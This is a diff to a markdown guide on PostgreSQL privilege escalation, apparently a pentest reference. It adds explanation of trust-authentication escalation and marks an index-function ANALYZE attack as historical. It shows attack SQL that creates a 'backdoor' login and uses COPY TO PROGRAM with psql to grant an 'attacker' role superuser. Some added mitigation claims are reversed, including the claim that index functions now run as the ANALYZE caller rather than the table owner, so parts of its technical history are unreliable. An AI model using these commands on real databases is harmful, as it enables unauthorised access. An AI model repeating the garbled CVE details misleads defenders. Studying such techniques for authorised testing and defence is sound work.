@@ -56,23 +56,42 @@ CREATE USER backdoor WITH PASSWORD 'secret' LOGIN;
 GRANT pg_read_server_files TO backdoor;
 ```
 
-**Escalating to Superuser via Trust Auth:**
+**Escalating to Superuser via Trust Auth + Command Execution:**
 
-If local trust authentication exists:
+Trust authentication (`host all all 127.0.0.1/32 trust` in `pg_hba.conf`) only grants passwordless database access for local connections — it does not itself provide OS-level or superuser privileges. The actual escalation requires **command execution capability** via `COPY TO PROGRAM`, which requires either superuser or membership in `pg_execute_server_program` (PostgreSQL 11+).
 
 ```sql
--- First get command execution
+-- Step 1: Grant command execution capability (requires CREATEROLE)
 GRANT pg_execute_server_program TO current_user;
 
--- Then execute psql as a trusted superuser to grant yourself superuser
+-- Step 2: Use COPY TO PROGRAM to invoke psql with trust auth
+-- This works because trust auth allows passwordless local connection as postgres
 COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "ALTER USER attacker WITH SUPERUSER;"';
 ```
 
-### ALTER TABLE Index Function Attack
+**Note:** Without `pg_execute_server_program` or equivalent superuser access, trust authentication alone cannot be exploited from SQL context.
 
-This technique exploits how PostgreSQL handles index functions when `ANALYZE` runs with elevated privileges. Commonly used in managed PostgreSQL instances (GCP Cloud SQL, etc.).
+### ALTER TABLE Index Function Attack (Historical)
 
-**Requirements:**
+**⚠️ This technique is outdated and does not work on modern PostgreSQL versions.**
+
+This attack exploited how PostgreSQL handled index functions when `ANALYZE` runs with elevated privileges. The vulnerabilities were patched in:
+
+- **CVE-2009-4136** (PostgreSQL 8.4.2, 8.3.9, 8.2.15, 8.1.19, 8.0.23, 7.4.27) — Index functions executed with table owner's privileges during ANALYZE/VACUUM
+- **CVE-2014-0062** (PostgreSQL 9.3.3, 9.2.7, 9.1.12, 9.0.16, 8.4.20) — Race condition in DDL allowing privilege escalation via concurrent table operations
+
+**Modern PostgreSQL (9.4+) mitigations:**
+
+- Index functions now execute with the privileges of the user running ANALYZE, not the table owner
+- `SECURITY DEFINER` functions in indexes are restricted
+- Table ownership changes invalidate expression index execution context
+
+The technique is documented here for historical reference and understanding legacy system vulnerabilities.
+
+<details>
+<summary>Historical attack details (click to expand)</summary>
+
+**Requirements (on vulnerable versions):**
 
 - Ability to create tables and functions
 - A superuser (or high-privilege user) that runs ANALYZE
@@ -123,6 +142,8 @@ ANALYZE temp_attack;
 -- Check results
 SELECT * FROM pwned;
 ```
+
+</details>
 
 ### SECURITY DEFINER Function Abuse
 
